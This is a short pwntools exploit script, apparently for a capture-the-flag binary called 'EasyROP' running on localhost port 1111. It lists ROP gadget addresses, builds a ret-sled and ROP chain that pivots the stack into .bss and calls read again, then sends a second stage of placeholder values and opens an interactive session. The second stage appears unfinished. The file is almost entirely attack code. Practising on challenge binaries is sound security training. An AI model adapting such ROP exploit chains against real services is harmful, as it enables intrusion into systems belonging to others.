from pwn import *

context.log_level = 'debug'
context.arch = 'i386'

r = remote('localhost', 1111)
e = ELF('./release/EasyROP')

slp = lambda: sleep(4)

# ROP Gadgets
pop_ebp = 0x804886b
pop_pop = 0x804886a
pop_pop_pop = 0x8048869
leave_ret = 0x8048575
popal = 0x8048808
ret = 0x8048432

# some space
buf = 0x804a110 # some space on bss
null_buf = 0x8049ffc # some space before bss (ro)


# locate, result => random
#  seq = cyclic(0x80)
#  r.send(seq[0x40:])
#  sleep(SLEEP)
#  r.send(seq[:0x40])
#  sleep(SLEEP)

# first read
pld = flat(
    # control ebp to make sure jumping to 0x8048775 works
    pop_ebp, buf+0x24,
    # push 0 then call read => avoid null byte in payload, magic!
    0x8048775, buf, 0x11111111,
)
pld = p32(ret)*((0x80-len(pld))//4) + pld
assert len(pld) == 0x80
r.send(pld[0x40:])
slp()
r.send(pld[:0x40])
slp()

# second read -> buf
pld = flat(
    buf, 0x11111111, 0x22222222, 0x33333333,
    0x44444444, 0x55555555, 0x66666666, 0x77777777,
    0x88888888,
)
r.send(pld)



#  rop = p32(pop_ebp) + p32(buf+0x24)
#  rop += p32(0x8048775) + p32(buf) + p32(0x11111111)
#  payload = p32(ret)*11 + rop
#  r.send(payload)
#  sleep(SLEEP)

#  payload = p32(ret)*16
#  r.send(payload)
#  sleep(SLEEP)

r.interactive()
